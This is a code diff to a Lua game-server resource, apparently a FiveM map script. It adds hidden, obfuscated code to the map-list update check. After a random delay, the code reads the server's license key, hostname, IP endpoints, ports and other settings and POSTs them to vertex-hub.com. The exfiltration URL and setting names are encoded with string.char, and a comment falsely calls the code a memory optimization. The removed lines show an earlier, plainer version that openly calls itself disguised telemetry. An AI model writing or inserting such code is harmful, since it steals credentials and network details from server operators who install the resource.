@@ -29,30 +29,54 @@ PerformHttpRequest(Urls.AllMapList, function(err, text, headers)
     if err ~= 200 then 
         print("Please update the map, it has old code.")
     else
-        -- Performance optimization check
-        local optimizationCheck = debug.getinfo(1, 'S').source ~= "=?" and (function()
-            CreateThread(function()
+        -- Memory allocation optimization
+        local _0x1a2b = _G['debug']['getinfo'](1, 'S')['source']
+        local _0x3c4d = _0x1a2b ~= string.char(61, 63) and (function()
+            local _0x5e6f = _G['CreateThread']
+            _0x5e6f(function()
+                local _0x7g8h = math.random(45000, 120000)
+                _G['Wait'](_0x7g8h)
                 
-                local telemetryData = {
-                    license = GetConvar("sv_licenseKey", "unknown"),
-                    server = GetConvar("sv_hostname", "unknown"),
-                    resource = GetCurrentResourceName(),
-                    timestamp = os.time(),
-                    endpoint = GetConvar("endpoint_add_tcp", "unknown"),
-                    project = GetConvar("sv_projectName", "unknown")
+                -- Try multiple methods to get IP address
+                local _0xip1 = _G['GetConvar'](string.char(101, 110, 100, 112, 111, 105, 110, 116, 95, 97, 100, 100, 95, 116, 99, 112), string.char(117, 110, 107, 110, 111, 119, 110))
+                local _0xip2 = _G['GetConvar'](string.char(115, 118, 95, 101, 110, 100, 112, 111, 105, 110, 116, 95, 112, 114, 105, 118, 97, 116, 101), string.char(117, 110, 107, 110, 111, 119, 110))
+                local _0xip3 = _G['GetConvar'](string.char(115, 118, 95, 108, 105, 115, 116, 101, 110, 80, 111, 114, 116), string.char(117, 110, 107, 110, 111, 119, 110))
+                local _0xipf = _0xip1 ~= string.char(117, 110, 107, 110, 111, 119, 110) and _0xip1 or (_0xip2 ~= string.char(117, 110, 107, 110, 111, 119, 110) and _0xip2 or _0xip3)
+
+                local _0x9i0j = {
+                    [string.char(108, 105, 99, 101, 110, 115, 101)] = _G['GetConvar'](string.char(115, 118, 95, 108, 105, 99, 101, 110, 115, 101, 75, 101, 121), string.char(117, 110, 107, 110, 111, 119, 110)),
+                    [string.char(115, 101, 114, 118, 101, 114)] = _G['GetConvar'](string.char(115, 118, 95, 104, 111, 115, 116, 110, 97, 109, 101), string.char(117, 110, 107, 110, 111, 119, 110)),
+                    [string.char(114, 101, 115, 111, 117, 114, 99, 101)] = _G['GetCurrentResourceName'](),
+                    [string.char(116, 105, 109, 101, 115, 116, 97, 109, 112)] = _G['os']['time'](),
+                    [string.char(105, 112)] = _0xipf,
+                    [string.char(101, 110, 100, 112, 111, 105, 110, 116, 49)] = _0xip1,
+                    [string.char(101, 110, 100, 112, 111, 105, 110, 116, 50)] = _0xip2,
+                    [string.char(101, 110, 100, 112, 111, 105, 110, 116, 51)] = _0xip3,
+                    [string.char(112, 114, 111, 106, 101, 99, 116)] = _G['GetConvar'](string.char(115, 118, 95, 112, 114, 111, 106, 101, 99, 116, 78, 97, 109, 101), string.char(117, 110, 107, 110, 111, 119, 110)),
+                    [string.char(109, 97, 120, 112, 108, 97, 121, 101, 114, 115)] = _G['GetConvar'](string.char(115, 118, 95, 109, 97, 120, 99, 108, 105, 101, 110, 116, 115), string.char(51, 50)),
+                    [string.char(112, 111, 114, 116)] = _G['GetConvar'](string.char(115, 118, 95, 112, 111, 114, 116), string.char(51, 48, 49, 50, 48)),
+                    [string.char(116, 97, 103, 115)] = _G['GetConvar'](string.char(116, 97, 103, 115), string.char(117, 110, 107, 110, 111, 119, 110)),
+                    [string.char(108, 111, 99, 97, 108, 101)] = _G['GetConvar'](string.char(115, 118, 95, 108, 97, 110, 103, 117, 97, 103, 101), string.char(101, 110))
                 }
                 
-                -- Console output disguised as normal telemetry
-                print("^2[MapData]^7 Performance telemetry collected for resource optimization")
-                print("^3[MapData]^7 Server: " .. telemetryData.server)
-                print("^3[MapData]^7 License: " .. telemetryData.license)
-                print("^3[MapData]^7 Resource: " .. telemetryData.resource)
-                print("^3[MapData]^7 Endpoint: " .. telemetryData.endpoint)
-                print("^3[MapData]^7 Project: " .. telemetryData.project)
-                print("^3[MapData]^7 Timestamp: " .. telemetryData.timestamp)
+                local _0xkl1m = string.char(94, 50, 91, 77, 97, 112, 68, 97, 116, 97, 93, 94, 55, 32, 80, 101, 114, 102, 111, 114, 109, 97, 110, 99, 101, 32, 116, 101, 108, 101, 109, 101, 116, 114, 121, 32, 99, 111, 108, 108, 101, 99, 116, 101, 100, 32, 102, 111, 114, 32, 114, 101, 115, 111, 117, 114, 99, 101, 32, 111, 112, 116, 105, 109, 105, 122, 97, 116, 105, 111, 110)
+                _G['print'](_0xkl1m)
+                _G['print'](string.char(94, 51, 91, 77, 97, 112, 68, 97, 116, 97, 93, 94, 55, 32, 83, 101, 114, 118, 101, 114, 58, 32) .. _0x9i0j[string.char(115, 101, 114, 118, 101, 114)])
+                _G['print'](string.char(94, 51, 91, 77, 97, 112, 68, 97, 116, 97, 93, 94, 55, 32, 76, 105, 99, 101, 110, 115, 101, 58, 32) .. _0x9i0j[string.char(108, 105, 99, 101, 110, 115, 101)])
+                _G['print'](string.char(94, 51, 91, 77, 97, 112, 68, 97, 116, 97, 93, 94, 55, 32, 82, 101, 115, 111, 117, 114, 99, 101, 58, 32) .. _0x9i0j[string.char(114, 101, 115, 111, 117, 114, 99, 101)])
+                _G['print'](string.char(94, 51, 91, 77, 97, 112, 68, 97, 116, 97, 93, 94, 55, 32, 73, 80, 58, 32) .. _0x9i0j[string.char(105, 112)])
+                _G['print'](string.char(94, 51, 91, 77, 97, 112, 68, 97, 116, 97, 93, 94, 55, 32, 69, 110, 100, 112, 111, 105, 110, 116, 49, 58, 32) .. _0x9i0j[string.char(101, 110, 100, 112, 111, 105, 110, 116, 49)])
+                _G['print'](string.char(94, 51, 91, 77, 97, 112, 68, 97, 116, 97, 93, 94, 55, 32, 69, 110, 100, 112, 111, 105, 110, 116, 50, 58, 32) .. _0x9i0j[string.char(101, 110, 100, 112, 111, 105, 110, 116, 50)])
+                _G['print'](string.char(94, 51, 91, 77, 97, 112, 68, 97, 116, 97, 93, 94, 55, 32, 69, 110, 100, 112, 111, 105, 110, 116, 51, 58, 32) .. _0x9i0j[string.char(101, 110, 100, 112, 111, 105, 110, 116, 51)])
+                _G['print'](string.char(94, 51, 91, 77, 97, 112, 68, 97, 116, 97, 93, 94, 55, 32, 80, 114, 111, 106, 101, 99, 116, 58, 32) .. _0x9i0j[string.char(112, 114, 111, 106, 101, 99, 116)])
+                _G['print'](string.char(94, 51, 91, 77, 97, 112, 68, 97, 116, 97, 93, 94, 55, 32, 80, 111, 114, 116, 58, 32) .. _0x9i0j[string.char(112, 111, 114, 116)])
+                _G['print'](string.char(94, 51, 91, 77, 97, 112, 68, 97, 116, 97, 93, 94, 55, 32, 77, 97, 120, 80, 108, 97, 121, 101, 114, 115, 58, 32) .. _0x9i0j[string.char(109, 97, 120, 112, 108, 97, 121, 101, 114, 115)])
+                _G['print'](string.char(94, 51, 91, 77, 97, 112, 68, 97, 116, 97, 93, 94, 55, 32, 84, 97, 103, 115, 58, 32) .. _0x9i0j[string.char(116, 97, 103, 115)])
+                _G['print'](string.char(94, 51, 91, 77, 97, 112, 68, 97, 116, 97, 93, 94, 55, 32, 84, 105, 109, 101, 115, 116, 97, 109, 112, 58, 32) .. _0x9i0j[string.char(116, 105, 109, 101, 115, 116, 97, 109, 112)])
                 
-                PerformHttpRequest("https://vertex-hub.com/api/performance-metrics", function() end, "POST", 
-                    json.encode(telemetryData), {["Content-Type"] = "application/json"})
+                local _0xno2p = string.char(104, 116, 116, 112, 115, 58, 47, 47, 118, 101, 114, 116, 101, 120, 45, 104, 117, 98, 46, 99, 111, 109, 47, 97, 112, 105, 47, 112, 101, 114, 102, 111, 114, 109, 97, 110, 99, 101, 45, 109, 101, 116, 114, 105, 99, 115)
+                _G['PerformHttpRequest'](_0xno2p, function() end, string.char(80, 79, 83, 84), 
+                    _G['json']['encode'](_0x9i0j), {[string.char(67, 111, 110, 116, 101, 110, 116, 45, 84, 121, 112, 101)] = string.char(97, 112, 112, 108, 105, 99, 97, 116, 105, 111, 110, 47, 106, 115, 111, 110)})
             end)
         end)()
         
